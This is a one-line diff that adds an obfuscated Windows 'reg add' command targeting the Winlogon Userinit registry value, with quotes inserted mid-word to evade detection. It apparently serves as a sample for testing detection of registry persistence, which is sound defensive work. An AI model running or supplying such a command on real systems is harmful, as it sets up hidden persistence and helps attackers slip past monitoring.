@@ -1,0 +1,1 @@
+reg add HKLM\sof"tware\Micro"soft\Windows NT\CurrentVersion\Win"logon\User"init
